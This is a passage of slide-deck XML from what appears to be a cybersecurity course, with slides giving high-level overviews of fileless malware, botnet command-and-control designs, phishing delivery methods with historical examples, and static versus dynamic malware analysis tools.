          <p:cNvPr id="4" name="Picture 3" descr="16_fileless_malware_chain.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3245771"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="461577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Fileless malware execution chain, every stage runs inside trusted OS processes or interpreters, leaving no binary artifacts on disk for traditional AV to scan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Botnets &amp; Distributed C2 Architecture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botnet</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a network of malware-infected devices ("bots" or "zombies") under the coordinated control of an operator (the "botmaster") via a Command-and-Control (C2) infrastructure. Botnets enable large-scale attacks including DDoS, spam campaigns, credential stuffing, and cryptocurrency mining.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="254316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C2 Architecture Models</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="20931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Centralized (Star Topology):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> All bots communicate directly with one or more C2 servers. Simple to operate but single point of failure, takedown of C2 servers kills the botnet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Peer-to-Peer (P2P):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Bots communicate with each other as peers, eliminating any single central server. Resilient, no single takedown point. Used by Kelihos, ZeroAccess.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain Generation Algorithms (DGA):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Bots and the C2 server independently compute the same pseudo-random domain names each day, making C2 domains unpredictable and hard to block in advance.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="254316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Botnet Use Cases</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="20931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DDoS Amplification:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Volumetric floods from thousands of geographically distributed bots overwhelm target bandwidth.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spam &amp; Phishing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Distributed email campaigns with no central originating IP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Credential Stuffing:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Automated credential pair testing against online services using residential IP ranges to bypass rate limiting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cryptojacking:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Hijacking bot CPU/GPU cycles for cryptocurrency mining, passive income for the botmaster.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Botnets &amp; Distributed C2 Architecture (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_botnet_c2_topologies.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3219382"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="458938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Botnet C2 topology comparison, centralized botnets are operationally simpler but vulnerable to sinkholing; P2P and DGA-based botnets are significantly more resilient to law enforcement takedown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Malware Delivery via Phishing &amp; Social Engineering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Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is the dominant initial access vector for malware delivery, the majority of ransomware, RAT, and spyware infections begin with a deceptive email or web interaction that manipulates the target into executing a malicious payload or surrendering credentials.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Pentagon 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2037619"/>
            <a:ext cx="1634225"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crafts lure email with malicious attachment or link</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Chevron 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2064781" y="2037619"/>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Target receives email appearing to come from trusted source</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Chevron 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3849006" y="2037619"/>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Target clicks link or opens attachment (execution trigger)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Chevron 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5633231" y="2037619"/>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Malware payload downloads or executes directly</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Chevron 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417456" y="2037619"/>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gains initial foothold on endpoint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Chevron 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9201681" y="2037619"/>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Lateral movement and privilege escalation begin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="Table 10"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="280556" y="3154945"/>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Phishing Variant</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Delivery Mechanism</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Notable Example</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="301050">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Spear Phishing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Targeted, personalized attack against specific individual</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Malicious attachment or credential-harvesting link</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Operation Aurora (2010), targeted Google engineers</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="301050">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Whaling</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Spear phishing targeting C-suite executives</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Fraudulent wire transfer requests + RAT delivery</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ubiquiti Networks $46M fraud (2015)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="301050">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Smishing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SMS-based phishing with malicious links</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>SMS link to fake mobile app download</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>FluBot Android banking malware campaign</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="301052">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vishing</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Voice call impersonation to manipulate target into running malware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Social engineering to execute remote access tool</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Twitter Bitcoin hack (2020), vishing IT support staff</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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Malware Delivery via Phishing &amp; Social Engineering (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_phishing_attack_chain.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3595417"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="496541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Phishing attack chain, social engineering and technical deception work together to bypass technical controls and reach the human as the final vulnerability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Malware Analysis, Static vs. Dynamic Techniques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Malware analysis</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is the systematic process of examining a malicious software specimen to understand its capabilities, propagation mechanisms, indicators of compromise, and network signatures, enabling detection rule creation and informed incident response.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="21793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Static Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="17293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Definition:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Examining the malware binary without executing it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tools:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>strings</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, PE Explorer, IDA Pro, Ghidra (NSA), Detect-It-Easy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Outputs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Imported API functions (reveals capabilities), embedded strings (C2 URLs, file paths), packed section indicators, file metadata.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Limitation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Encrypted and obfuscated code obscures true capability. Packed binaries must be unpacked before analysis.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>
            <a:ext cx="5192677" cy="21793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Dynamic Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>
            <a:ext cx="5072677" cy="17293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Definition:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Executing the malware in an instrumented sandbox environment and observing runtime behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tools:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Cuckoo Sandbox, ANY.RUN, Joe Sandbox, Wireshark, Sysmon, Procmon.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Outputs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> System calls made, files created/modified/deleted, registry changes, network connections initiated, process spawns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Limitation:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Sophisticated malware detects sandbox environments and deactivates itself to avoid analysis.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Malware Analysis, Static vs. Dynamic Techniques (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_malware_analysis_workflow.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3417295"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="478729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Malware analysis workflow, static and dynamic analysis are complementary: static reveals code structure, dynamic reveals runtime behavior, together producing actionable indicators of compromise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WannaCry Ransomworm (2017)</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WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
